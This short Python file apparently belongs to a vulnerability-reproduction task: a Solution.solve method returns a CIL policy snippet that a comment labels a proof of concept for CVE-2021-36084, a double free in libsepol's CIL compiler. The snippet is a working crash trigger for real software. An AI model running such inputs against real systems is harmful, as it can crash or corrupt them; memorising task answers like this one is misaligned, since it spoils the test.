import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        # PoC for CVE-2021-36084 - double free in libsepol/cil
        poc = """(classpermission anon)
(classpermissionset (anon) (open read))

(macro use_cp ((classpermission cp))
    (classpermissionset (cp) (open read))
)

(call use_cp (anon))"""
        return poc.encode()